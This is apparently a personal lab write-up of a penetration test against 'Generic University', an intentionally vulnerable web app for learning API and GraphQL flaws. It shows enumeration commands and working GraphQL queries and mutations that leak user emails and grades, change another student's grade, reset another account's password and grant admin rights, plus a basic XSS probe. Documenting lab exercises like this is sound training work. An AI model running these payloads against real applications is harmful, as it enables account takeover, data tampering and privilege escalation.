# Generic University
[Generic University](https://github.com/InsiderPhD/Generic-University) is a "Under Construction" vulnerable web application for student of generic university to see their grades online. This project can be found under [OWASP Vulnerable Web Applications DIrectory](https://owasp.org/www-project-vulnerable-web-applications-directory/). It contains some of the vulnerabilities found in [OWASP API Top 10 2019](https://github.com/InsiderPhD/Generic-University#vulnerabilities) and with very clear [[#Goals|goals]].

My Personal Objective in this undertaking would be to go through my [[0. Web Pentest Workflow#General Workflow|workflow]] to refine the enumeration steps. The enumeration done here will be focused on Application Profiling. Next objective will be to find all the vulnerabilities that is in the author's goals. A good reference would be the docker image creator -  busk3r's own [writeup](https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-2-methodology-and-examples-5992093bcc24). 

## Author's Goals
|S/N|Goals|Answer|
|---|---|---|
|1|Find the emails of the administrator|[[#Find Administrator Emails]]|
|2|Brute force the API to find new endpoints|[[#Discover Hidden Content]] |
|3|Find out what grades everyone got in a class|[[#Find Everyone's Grades]]|
|4|Edit someone's grade|[[#Edit Someone's Grades]]|
|5|Make an account|[[#Registering an account]]|
|6|Access the GraphQL API|[[#Graphql Enumeration]]|
|7|Change another account's password|[[#Change Another Account's Password]]|
|8|Login to your account|[[#Exploring with a Registered Account]]|
|9|Access admin API|[[#Make a user account Admin]]|
|10|Find out what vulnerabilities the IT admins have ignored|[[#Exploring with a Registered Account]]|
|11|Make your account an admin|[[#Make a user account Admin]]|
|12|Access the admin control panel|[[#Exploring with a Registered Account]]|
|13|Fire a blind XSS in the admin control panel and validate with your new admin account|[[#XSS on vulnerable forms]]|
|14|Delete everything|[[#Make a user account Admin]]|
|15|Restore everything|[[#Make a user account Admin]]|

## 2a. Mapping Application Content
### Explore Visible Content
#### Initial Exploration
- We do an initial exploration by setting up burp and exploring the visible web pages with burp proxy and passive crawling turned on. In the table are that of the visible content visited.

|Screenshots|Screenshots|
|---|---|
|![[Pasted image 20220817152125.png]]|![[Pasted image 20220817152148.png]]|
|![[Pasted image 20220817152207.png]]|![[Pasted image 20220817152854.png]]|
|![[Pasted image 20220817152607.png]]|![[Pasted image 20220817152620.png]]|
|![[Pasted image 20220817152930.png]]|![[Pasted image 20220817152945.png]]|

- The following sitemap is obtained.

![[Pasted image 20220817164113.png]]

- From the sitemap above, we can see that 
- We then use Engagement tools : "Find Scripts", "Find Reference", "Find Comments"

|Tools|Results|
|---|---|
|Find Script|![[Pasted image 20220817164319.png]]|
|Find Comments|No interesting comments|
|Find References|![[Pasted image 20220817164736.png]]![[Pasted image 20220817164755.png]]![[Pasted image 20220817164814.png]]|

- From the results extracted above, we can see that there are a few interesting links we can visit or enumerate further.

- Additionally, an interesting finding at this stage is `/api/users/6`.

![[Pasted image 20220817184910.png]]

- As highlighted above, the `GET` request sent makes use of XMLHttpRequest to send to an API endpoint to get the user with `id` 6. 

- We hit a "dead end" for exploring visible content here and we will move on to the other kinds of enumeration - [[#Discover Hidden Content]], [[#Discover Default Content]], [[#Consult Public Resources]]

#### Further Exploration
- With results from the enumeration from [[#Discover Hidden Content]], [[#Discover Default Content]], we are back to exploring the application further.

|Further Findings|Screenshot|
|---|---|
|/register|![[Pasted image 20220817184404.png]]|
|.htaccess|![[Pasted image 20220817184454.png]]|
|/web.config|![[Pasted image 20220817191904.png]]|
|/api/users|![[Pasted image 20220817191629.png]]|
|/api/roles|![[Pasted image 20220817191710.png]]|
|/api/classes|![[Pasted image 20220817191744.png]]|

- We use the findings above to further explore visible content. This is done by [[#Registering an account]] and subsequently [[#Exploring with a Registered Account]].

##### Registering an account
- We use the `/register` function to register an account and after registration we are 
![[Pasted image 20220818112810.png]]
![[Pasted image 20220818115501.png]]

##### Exploring with a Registered Account
- With registered account we continue out enumeration. When we enumerated the [[#Using a API Specific Wordlist https github com chrislockard api_wordlist blob master objects txt|API endpoints]] below we noticed that /api/user and /api/admin is redirected to login page. Hence we will attempt to find out more about the API endpoints with this registered account. 
- As can be seen below, /api/admin gave us the admin API endpoints.

![[Pasted image 20220818121137.png]]

- However, we are unable to use the API endpoints as we did not have the required permissions.

![[Pasted image 20220818121815.png]]

- In our directory busting below, we also had a redirect when `/admin` directory was involved. Hence we will attempt to browse that page.

![[Pasted image 20220818121310.png]]

- We attempt to see if we can acces "Security Vulnerabilities" link and it seems like with a student account, we are able to see the security vulnerabilities.

![[Pasted image 20220823001205.png]]

### Consult Public Resources
![[Pasted image 20220818113616.png]]

- One of the enumeration steps involved is consulting public resources and hence with this we go to the github of the author to look for some clues. Indeed, we get to know that there should be at least 4 api endpoints and based on what we found, it is possible that we are missing out on one of the endpoints and that is 'grades'.

![[Pasted image 20220818114315.png]]

### Discover Hidden Content
- Next up we will be doing directory enumeration using feroxbuster. We did not use "Discover Content" it might pollute the sitemap result with it's recursive function. Somehow feroxbuster is faster too.

#### Initial Discovery
##### Using common.txt
```
feroxbuster -u <url> -w /usr/share/wordlists/dirb/common.txt -o out.txt
```

![[Pasted image 20220817122822.png]]

- Discovering APIs endpoints

```
feroxbuster -u <url>/api -w /usr/share/wordlists/dirb/common.txt -o api.txt
```

![[Pasted image 20220817125428.png]]

- Attempted `/js`, `/css`, `/image` discovery. As can be seen below, nothing was found.

|Extension|Results|
|---|---|
|`/js`|![[Pasted image 20220817173701.png]]![[Pasted image 20220817173712.png]]|
|`/css`|![[Pasted image 20220817173609.png]]![[Pasted image 20220817173642.png]]|
|`/image`|![[Pasted image 20220817173935.png]]![[Pasted image 20220817173945.png]]|

##### Using a [API Specific Wordlist](https://github.com/chrislockard/api_wordlist/blob/master/objects.txt) 
- We enumerated the `/api` and `/images` extension further with a wordlist that is collated by `chrislockard`.

![[Pasted image 20220817174335.png]]
![[Pasted image 20220817174854.png]] 

- From the result above, we can see that for the API endpoints enumerated are the same with the one enumerated with `common.txt`.

##### Using [GraphQL specific wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/graphql.txt)
![[Pasted image 20220822113008.png]]

- From the above, we can see that graphQL is used and graphIQL(Introspection) is enabled. 

### Discover Default Content
#### Nikto
- Using Nikto Scan on webserver

![[Pasted image 20220817180324.png]]

- Using `-root` scan to scan other directories that we have enumerated.

![[Pasted image 20220817182606.png]]
![[Pasted image 20220817184219.png]]

- From the above result we see some interesting vulnerabilities being flagged like te `/api/users` being flagged as something interesting and `/admin` flagged with OSVDB-630.

### Test for Debug Parameters
![[Pasted image 20220818180619.png]]
![[Pasted image 20220818180748.png]]
![[Pasted image 20220818154432.png]]
![[Pasted image 20220818155331.png]]

- From the response above, it seems like debug mode is on.

#### Graphql Enumeration
- Using [graphw00f](https://github.com/dolevf/graphw00f), we were able to determine that graphql is used and it can be found at `/graphql`.

![[Pasted image 20220822144351.png]]

- Next we used [[#Using GraphQL specific wordlist https github com danielmiessler SecLists blob master Discovery Web-Content graphql txt |ferox buster]] to enumerate for any other graphql endpoints.

- Following [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql) GraphQL guide, we did a "Basic Enumeration" and managed to find that there is yet another endpoint that was not discovered - "Vulnerabilities" 

![[Pasted image 20220818172842.png]]

- We found out that `/vulnerabilities` is parked under `/admin`

![[Pasted image 20220818173130.png]]

- We then use the burp extension InQL, InQL Scanner to scan for the schema for graphQL used. 

![[Pasted image 20220822120844.png]]

The above query can be visualised using [graphql voyager](https://ivangoncharov.github.io/graphql-voyager/) where we can see the relationships of the different attributes.

![[Pasted image 20220822143443.png]]

- We will be interested in the `mutation` schema as it can help understand what value the mutation can manipulate. 

![[Pasted image 20220822143659.png]]
![[Pasted image 20220822143756.png]]

## 2b. Mapping Attack Surface
- With the information gathered above, we can proceed to mapping the surface of attack.
	- API endpoints - Information Leakage
	- GraphQL API endpoint - Probable Injection via mutation query.
	- Display of user side data on admin panel (vulnerable vulnerability submission form) - probable XSS

## 3. Vulnerability Assessment / Exploitation
### API Endpoints Information Leakage
- As can be seen in [[#Further Exploration]] there is information leakage when `/api/[endpoint name]` is used. 
- However, this way of listing things is not efficient as we have to manually correlate.
- Since GraphQL is available, we will use GraphQL to query the data according to what we need.

### GraphQL API Injection 
#### Query
##### Find Administrator Emails
- Using the query below, we canlist all users, their emails and their roles

```
query {
	users {
    name
    id
    email
    role{
      id
      name      
    }
	}
}
```

|Admin|Admin|
|---|---|
|![[Pasted image 20220822164348.png]]|![[Pasted image 20220822164409.png]]|
|![[Pasted image 20220822164430.png]]||

##### Find Everyone's Grades
- Using the query below, we can list all classes, and the grades that corresponds to the students. 

```
query {
	class {
           id
           name
		   description
		   grades {
			       grade
		           comments
                   user{
                         id
                         name
                              }
		          }
	      }
}
```

![[Pasted image 20220822163605.png]]

#### Mutation
- Over here we will demonstrate how mutations can be used to manipulate server side values.

##### Edit Someone's Grades
![[Pasted image 20220822165002.png]]
![[Pasted image 20220822165512.png]]
- When we query the class grades with [[#Find Everyone's Grades]] we notice that there is this student that is in `uni_class_id:2`, with `grade id: 22` and `user_id:5` with a low grade of 18. 
- We also found a mutation query which takes in the following parameters.

![[Pasted image 20220823000012.png]]

- We shall attempt to help him push his grades to a better one with the `gradeMutation` query like below : 

```
mutation {
	gradeMutation(comments:"code*", created_at:"code*", uni_class_id:2, updated_at:"code*", user_id:5, grade:90, id:22) {
		comments
		created_at
		updated_at
		grade
		id
		user {
			role {
				created_at
			}
		}
		class {
			description
		}
	}
}
```

- As can be seen below, his grades are sucesfully changed.

![[Pasted image 20220822165609.png]]

##### Change Another Account's Password
- We noticed that there is a mutation `updateUserPassword` which takes in User `id` as a string and `password` as a string.

![[Pasted image 20220822234611.png]]

- We attempt to change a random user's password by using this mutation

```
mutation {
	updateUserPassword(password:"123pass", id:"1") {
	id
    name
    password
	role {
	   name
		 }
	email
    updated_at
	}
}
```

![[Pasted image 20220822234725.png]]
![[Pasted image 20220822234816.png]]

- As can be seen above, we are able to login as the user "Cicero Weimann" with the password `123pass`.

##### Make a user account Admin
- We will now attempt to use the other mutation `userMutation` to see if we can do any things with it. 

![[Pasted image 20220822235042.png]]

- Looking at the parameters, it seems like we might be able to change an account's role id. We might even be able to change it's name.

```
mutation {
	userMutation(role_id:1, name:"attacker", id:1) {
	id
    name
    password
	role {
	   name
		 }
	email
    updated_at
	}
}
```

![[Pasted image 20220822235520.png]]
![[Pasted image 20220822235536.png]]

- So it seems we have successfully made this student an "Admin" and changed his name into "attacker".

- This is verified by the fact that we can run the `/restore` and `/delete` function which we were unable to call without admin rights.

![[Pasted image 20220823005340.png]]
![[Pasted image 20220823005542.png]]


### XSS on vulnerable forms
- From above, we know that the inputs form `/admin/security` page comes form "Report a Security Vulnerability" Form.
- In the form, we see that there are three input fields. 
- We therefore manually test each input field with the following payload 

```
<script>alert()</script>
```

- Based on out test which can be seen below, only "The Issue" field is vulnerable to XSS.

![[Pasted image 20220823005845.png]]
![[Pasted image 20220823010015.png]]
![[Pasted image 20220823005756.png]]
![[Pasted image 20220823005708.png]]


